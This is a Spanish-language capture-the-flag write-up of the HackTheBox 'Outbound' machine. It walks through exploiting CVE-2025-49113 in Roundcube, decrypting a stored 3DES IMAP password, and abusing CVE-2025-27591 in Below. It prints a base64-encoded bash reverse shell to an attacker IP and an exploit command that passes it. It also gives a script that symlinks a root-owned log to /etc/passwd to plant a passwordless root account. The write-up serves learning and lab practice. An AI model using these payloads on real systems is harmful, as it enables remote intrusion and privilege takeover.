---
title: Outbound - Easy (HTB)
permalink: /Outbound-HTB-Writeup/
tags:
  - Linux
  - Easy
  - Roundcube
  - Sudoers
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: Outbound - Easy (HTB)
seo_description: Explota el servicio Rouncube y abusa de privilegios Sudo para vencer Outbound.
excerpt: Explota el servicio Rouncube y abusa de privilegios Sudo para vencer Outbound.
header:
  overlay_image: /assets/images/headers/outbound-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/outbound-hackthebox.jpg
---
![image-center](/assets/images/posts/outbound-hackthebox.png)
{: .align-center}

**Habilidades:** CVE-2025-49113 - `Roundcube` Post-Auth RCE via PHP Deserialization, MySQL Database Enumeration, IMAP Password Decrypt (3DES Algorithm), Credentials Leakage, Abusing Sudoers Privileges, CVE-2025-27591 - `Below` Local Privilege Escalation
{: .notice--primary}

# Introducción

Outbound es una máquina Linux de dificultad `Easy` en HackTheBox en la que debemos vulnerar un sitio web que implementa el servicio Roundcube mediante una vulnerabildiad que nos permite ejecutar código PHP en el servidor, para después enumerar internamente hasta descifrar una contraseña que nos permita acceso inicial por SSH.

La escalada de privilegios la realizaremos a través de la explotación de un CVE en el servicio `below`, el cual posee un CVE que nos permitirá obtener acceso privilegiado en la máquina.

> Machine Information
>
> As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2
{: .notice--info}
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.10.11.77           
PING 10.10.11.77 (10.10.11.77): 56 data bytes
64 bytes from 10.10.11.77: icmp_seq=0 ttl=63 time=292.339 ms

--- 10.10.11.77 ping statistics ---
1 packets transmitted, 1 packets received, 0.0% packet loss
round-trip min/avg/max/stddev = 292.339/292.339/292.339/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos lanzando un escaneo de puertos para intentar identificar puertos abiertos en la máquina víctima

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.77 -oG openPorts

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-19 10:25 EDT
Nmap scan report for 10.10.11.77
Host is up (0.29s latency).
Not shown: 39254 closed tcp ports (reset), 26279 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 23.10 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Lanzaremos un segundo escaneo que se encargue de intentar identificar la versión y servicio que se ejecuta en los puertos que identificamos

~~~ bash
nmap -p 22,80 -sVC 10.10.11.77 -oN services

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-19 10:29 EDT
Nmap scan report for 10.10.11.77
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.73 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

La captura evidencia dos servicios, `ssh` y `http`, los cuales no parecen poseer vulnerabilidades públicas explotables.

El servidor aplica una redirección a `mail.outbound.htb`, agregaremos este nombre de dominio a nuestro archivo `/etc/hosts` para aplicar correctamente las resoluciones DNS

~~~ bash
cat /etc/hosts | grep outbound.htb 

10.10.11.77 mail.outbound.htb
~~~


## Web Analysis

Realizando un escaneo de las tecnologías web, podremos darnos cuenta que el servidor utiliza el servicio `Roundcube`

~~~ bash
whatweb http://mail.outbound.htb

http://mail.outbound.htb [200 OK] Bootstrap, Content-Language[en], Cookies[roundcube_sessid], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], HttpOnly[roundcube_sessid], IP[10.10.11.77], JQuery, PasswordField[_pass], RoundCube, Script, Title[Roundcube Webmail :: Welcome to Roundcube Webmail], X-Frame-Options[sameorigin], nginx[1.24.0]
~~~

Al navegar hasta la web raíz en `mail.outbound.htb`, veremos una página donde podremos iniciar sesión

![image-center](/assets/images/posts/outbound-1-hackthebox.png)
{: .align-center}

Podemos ver la versión desde el código fuente de la web a través de una consulta rápida

~~~ bash
curl -sL http://mail.outbound.htb/ | tr ',' '\n' | grep rcversion                   
"rcversion":10610
~~~
<br>


# Intrusión / Explotación
---
## `Roundcube` Post-Auth Remote Code Execution via PHP Deserialization (CVE-2025-49113)

La versión del contexto actual forma parte de las versiones afectadas por CVE-2025-49113, una vulnerabilidad en `Roundcube` la cual permite a usuarios autenticados ejecutar comandos en el servidor a través de una falla durante la deserialización de objetos PHP

La vulnerabilidad surge cuando no se valida adecuadamente el parámetro `_from` en el archivo `program/actions/settings/upload.php`, que maneja las subidas de archivos. Esto permite a un atacante subir un objeto PHP serializado con el fin de ejecutar comandos en el servidor. 

![image-center](/assets/images/posts/outbound-2-hackthebox.png)
{: .align-center}

En el ejemplo anterior se intenta enviar un comando dentro de un objeto PHP serializado, en este caso para ejecutar una reverse shell

``` bash
echo 'YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTgvNDQzIDA+JjEn' | base64 -d
bash -c 'bash -i >& /dev/tcp/10.10.14.118/443 0>&1'% 
```

Puedes encontrar más detalles técnicos sobre esta vulnerabilidad en el siguiente [blog](https://www.offsec.com/blog/cve-2025-49113/).

Iniciaremos un listener que se encargue de recibir una reverse shell por un puerto, en mi caso usé el `443`

``` bash
nc -lvnp 443
```

Podemos utilizar la siguiente [PoC](https://github.com/hakaioffsec/CVE-2025-49113-exploit) para explotar esta vulnerabilidad y ejecutar comandos en el servidor

~~~ bash
CVE-2025-49113-exploit $ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/10.10.14.84/443 0>&1'"
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
~~~


## Shell as `www-data` - `mail` Container

En nuestro listener recibiremos una shell como el usuario `www-data`

``` bash
nc -lvnp 443
Connection from 10.10.11.77:38214
bash: cannot set terminal process group (248): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/$ 
```

### TTY Treatment

Realizaremos el tratamiento de la TTY para poder obtener una consola más interactiva

``` bash
www-data@mail:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@mail:/$ ^Z
[1]  + 23185 suspended  nc -lvnp 443
andrees@HackBookPro CVE-2025-49113-exploit $ stty raw -echo;fg  
[1]  + 23185 continued  nc -lvnp 443
                                    reset xterm
```

Haremos un último ajuste que permita limpiar la terminal con `Crtl+L` y ajustaremos las proporciones (puedes obtener las tuyas con el comando `tty size` desde una nueva terminal)

``` bash
www-data@mail:/$ export TERM=xterm
www-data@mail:/$ stty rows 42 columns 152
```

Si enumeramos las interfaces de red, veremos que la IP que se muestra corresponde a la típica de `docker`

``` bash
www-data@mail:/$ hostname -I
172.17.0.2
```


## MySQL Enumeration

En el siguiente archivo de configuración se encuentran las credenciales de conexión de la base de datos, aparentemente en `MySQL`

~~~ bash
www-data@mail:/$ cat /var/www/html/roundcube/config/config.inc.php
<?php
...
...
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
...
...
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
...
...
...
~~~

Nos conectaremos a la base de datos usando el binario de `mysql`

~~~ bash
www-data@mail:/var/www/html/roundcube/config$ mysql -u roundcube -p'RCDBPass2025'

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 51
Server version: 10.11.13-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
~~~

Mostrando las bases de datos, veremos la de `roundcube`

``` bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          |
+--------------------+
2 rows in set (0.001 sec)
```

Según la [wiki](https://github.com/roundcube/roundcubemail/wiki/Configuration#:~:text=%27des%5Fkey) de`Roundcube`, este sistema almacena credenciales IMAP cifradas de usuarios de forma temporal en la tabla `session`, concretamente en la columna `vars`

``` bash
MariaDB [(none)]> use roundcube;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [roundcube]> describe session;
+---------+--------------+------+-----+---------------------+-------+
| Field   | Type         | Null | Key | Default             | Extra |
+---------+--------------+------+-----+---------------------+-------+
| sess_id | varchar(128) | NO   | PRI | NULL                |       |
| changed | datetime     | NO   | MUL | 1000-01-01 00:00:00 |       |
| ip      | varchar(40)  | NO   |     | NULL                |       |
| vars    | mediumtext   | NO   |     | NULL                |       |
+---------+--------------+------+-----+---------------------+-------+
4 rows in set (0.001 sec)
```

Listaremos los registros aplicando la sentencia `LIMIT`, para ver solamente un rango de registros y evitar ver mucha información en una sola consulta

``` bash
MariaDB [roundcube]> select vars from session limit 0,1
```

En este caso obtenemos una cadena de texto considerable, la cual podemos intentar decodificar

Guardaremos la cadena codificada en un archivo para poder aplicar un tratamiento menos engorroso, en este caso nos interesan los campos `username` y `password`

~~~ bash
cat base64.txt| base64 -d | tr ';' '\n' | grep -E "username|password" 
username|s:5:"jacob"
password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
~~~


## 3DES Decrypt

Buscando en internet sobre cómo descifrar contraseñas de `Roundcube`, nos encontraremos con el siguiente [foro](https://www.roundcubeforum.net/index.php?topic=23399.0) que nos brinda una pista del cifrado utilizado.

Las contraseñas almacenadas en la versión de `Rouncube` se cifran con el algoritmo `3DES`. Para descifrar la contraseña, necesitaremos la clave `des_key`

~~~ bash
www-data@mail:/$ cat /var/www/html/roundcube/config/config.inc.php

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

...
<SNIP>
...
~~~

Podemos usar la librería `pycryptodome` para descifrar la contraseña con unas pocas líneas de código.

Para utilizarla, instalaremos la librería con `pip`, ya sea de forma global o en un entorno virtual

``` bash
pip install pycryptodome
```

El siguiente script en `python` debería ayudarnos a descifrar rápidamente la contraseña

``` python
from Crypto.Cipher import DES3
from base64 import b64decode

# Contraseña de jacob encriptada
encrypted = "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
des_key = "rcmail-!24ByteDESkey*Str"

try:
    des_key = des_key.encode('utf-8')
    data = b64decode(encrypted)
    iv = data[:8]
    ciphertext = data[8:]
        
    cipher = DES3.new(des_key, DES3.MODE_CBC, iv=iv)
    decrypted = cipher.decrypt(ciphertext)
    print("Decrypted password: " + decrypted.rstrip(b"\0").decode('utf-8', errors='ignore'))        
except Exception as e:
    print(f"Error: {str(e)}")
```

Al ejecutar el script, obtendremos la contraseña en texto claro

``` bash
python3 3des_decrypt.py 
Decrypted password: 595mO8DmwGeD
```

Entonces ahora tendríamos las siguientes credenciales de acceso

``` bash
jacob:595mO8DmwGeD
```


## User Pivoting to `jacob`

La contraseña nos servirá para cambiar al usuario `jacob` con el comando `su`

~~~ bash
www-data@mail:/$ su jacob
Password: 
jacob@mail:/$ 
~~~

Al intentar conectarnos por `ssh`, la contraseña no será la correcta

``` bash
ssh jacob@10.10.11.77
jacob@10.10.11.77's password: 
Permission denied, please try again.
```


## Credentials Leakage

Durante una enumeración manual, notaremos la presencia de un correo electrónico para el usuario `jacob`. Esto tiene sentido al encontrarnos dentro de un contenedor llamado `mail` (inserte el meme [`Galaxy Brain`](https://www.youtube.com/shorts/tf4De9ozZYc))

``` bash
jacob@mail:/$ ls -la /var/mail
total 24
drwxrwsr-x 1 root  mail 4096 Jul  9 12:41 .
drwxr-xr-x 1 root  root 4096 Jun  6 18:55 ..
drwxrwsr-x 5 jacob mail 4096 Jul  9 12:41 .imap
-rw-rw---- 1 jacob mail 2169 Jun  8 12:10 jacob
-rw-rw---- 1 mel   mail    0 Jun  8 12:06 mel
-rw-rw---- 1 tyler mail    0 Jun  8 13:28 tyler
```

Al inspeccionar el buzón de `jacob`, veremos algunos mensajes, donde el primero contiene el siguiente mensaje enviado por `tyler`

~~~ bash
From tyler@outbound.htb  Sat Jun  7 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
	id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-UID: 2                                        
Status: O

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler
~~~

- Se menciona que recientemente han cambiado las políticas, lo que ha resultado en el cambio de la contraseña de `jacob`
- Las nueva contraseña es `gY4Wr3a1evp4`, y se le recuerda a `jacob` cambiarla

Luego, se recibió el siguiente correo electrónico, enviado por el usuario `mel`

~~~ bash
From mel@outbound.htb  Sun Jun  8 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
	id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 3                                        
Status: O

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
~~~

- Se ha experimentado alto consumo en el servidor principal.
- Se ha habilitado el monitoreo de recursos empleando la herramienta `Below`, además de que `jacob` tiene privilegios suficientes para inspeccionar logs.


## Shell as `jacob`

La contraseña recuperada del correo nos permitirá conectarnos por `ssh` como el usuario `jacob` a la máquina real

~~~ bash
ssh jacob@10.10.11.77                             
jacob@10.10.11.77\'s password: 

Last login: Mon Jul 14 12:41:05 2025 from 10.10.15.48
jacob@outbound:~$ 
jacob@outbound:~$ export TERM=xterm # Limpiar la pantalla con Ctrl+L
~~~

Ya podremos ver la flag del usuario sin privilegios

``` bash
jacob@outbound:~$ cat user.txt 
a99...
```
<br>


# Escalada de Privilegios
---
## Sudoers Privileges

Listando los privilegios disponibles configurados con `sudo`, veremos que podemos ejecutar la herramienta [`below`](https://github.com/facebookincubator/below), la cual fue desarrollada por Meta

~~~ bash
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
~~~

Vemos cómo se bloquea el uso de algunas opciones, las cuales nos permitirían escalar privilegios de forma más sencilla.

Al ejecutar la herramienta, veremos que se encuentra en su versión `0.8.0`

![image-center](/assets/images/posts/outbound-3-hackthebox.png)
{: .align-center}


## CVE-2025-27591 - `Below` Local Privilege Escalation

Esta es una vulnerabilidad que afecta a la herramienta `below` en versiones anteriores a la `v0.9.0`.

### Understanding Vulnerability

La herramienta `Below` crea un archivo de log en la ruta `/var/log/below` con permisos de escritura global o `world-writable` (`0777`). Un atacante puede aprovechar esto para crear enlaces simbólicos maliciosos apuntando a archivos privilegiados.

En este caso tenemos permisos de escritura de todos los logs de la herramienta tal como lo menciona el CVE, incluyendo a los logs del usuario `root`

~~~ bash
jacob@outbound:/tmp$ ls /var/log/below -l
total 8
-rw-rw-rw- 1 jacob jacob  236 Jul  8 20:45 error_jacob.log
-rw-rw-rw- 1 root  root     0 Jul 13 16:57 error_root.log
drwxr-xr-x 2 root  root  4096 Jul 13 16:35 store
~~~

Como prueba de concepto, crearemos un archivo `passwd` malicioso que contenga una sola línea, donde definimos un usuario `evil` con permisos absolutos y sin contraseña

``` bash
# Fake passwd file
evil::0:0:root:/root:/bin/bash
```

> El archivo `/etc/passwd` en Linux es un archivo de texto que almacena información sobre todas las cuentas de usuario del sistema.
{: .notice--info}

### Exploiting

Podemos encontrar diversas pruebas de concepto disponibles en [Github](https://github.com/incommatosereal/CVE-2025-27591-PoC) que podemos utilizar para explotar esta vulnerabilidad

``` bash
#!/bin/bash
echo 'evil::0:0:root:/root:/bin/bash' > /tmp/evilpasswd 
rm -f /var/log/below/error_root.log 
ln -s /etc/passwd /var/log/below/error_root.log # Symlink
cat /tmp/evilpasswd > /var/log/below/error_root.log # Overwrite passwd 
export LOGS_DIRECTORY=/var/log/below

# Exploit
sudo /usr/bin/below snapshot --begin now 2>/dev/null
su evil
```


## Root Time

Guardaremos esta PoC en un archivo y le asignaremos permisos de ejecución, basta con ejecutarlo un par de veces para obtener acceso como el usuario `evil` privilegiado que creamos

~~~ bash
jacob@outbound:/tmp$ chmod +x poc.sh 
jacob@outbound:/tmp$ ./poc.sh 
./poc.sh: line 6: /var/log/below/error_root.log: Permission denied
su: user evil does not exist or the user entry does not contain all the required fields
jacob@outbound:/tmp$ ./poc.sh 
evil@outbound:/tmp# id
uid=0(evil) gid=0(root) groups=0(root)
~~~

Ya podremos ver la última flag ubicada en el directorio `/root`

``` bash
evil@outbound:/tmp# cd
evil@outbound:~# cat root.txt 
4ce...
```

Gracias por leer, a continuación te dejo la cita del día.

> Most great people have attained their greatest success just one step beyond their greatest failure.
> — Napoleon Hill
{: .notice--info}